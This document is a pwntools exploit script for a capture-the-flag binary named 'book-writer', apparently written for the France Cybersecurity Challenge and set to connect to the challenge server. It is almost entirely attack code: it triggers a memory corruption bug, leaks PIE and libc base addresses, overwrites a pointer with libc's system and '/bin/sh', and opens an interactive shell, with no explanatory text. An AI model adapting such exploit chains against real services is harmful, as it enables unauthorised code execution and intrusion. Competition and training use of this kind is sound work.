from pwn import *


if args.LOCAL:
    io = process('./book-writer')
    if args.GDB:
        cmd="""
        b* read_page
        """
        gdb.attach(io, cmd)
else: 
    io = remote('challenges.france-cybersecurity-challenge.fr', 2112)
    
elf = ELF('./book-writer')
libc = ELF('./libc-2.36.so')
io.sendline(b'1')
io.sendline(b'a'*10)
io.sendline(str(u64(p64(0xf000000000000001))).encode())

io.sendline(b'1')
io.sendline(b'a'*10)
io.sendline(b'2')

io.sendline(b'2')
io.sendline(b'0')
io.sendline(b'5')

io.sendline(b'4')
io.recvuntil(b'\x00')
io.recv(0x10-1)

pie = u64(io.recv(6)+b'\0\0') - 0x11e9

print(hex(pie))

pause()

io.sendline(b'1')
io.sendline(b'b'*10)
io.sendline(b'1056')

io.sendline(b'2')
io.sendline(b'0')

for i in range(4):
    io.sendline(b'5')

io.sendline(b'4')
io.recvuntil(b'b'*10)
io.recvuntil(b'b'*10)
io.recvuntil(b'b'*10)
io.recv(54)

libc.address = u64(io.recv(6) + b'\0\0') + 0x24ff0
print(hex(libc.address))

io.sendline(b'2')
io.sendline(b'0')
io.sendline(b'5')

io.sendline(b'3')
io.sendline(b'A'*0x10+b'/bin/sh;'+p64(libc.sym.system))
io.sendline(b'2')
io.sendline(b'1')
io.sendline(b'3')
io.sendline(b'/bin/sh\0')

io.interactive()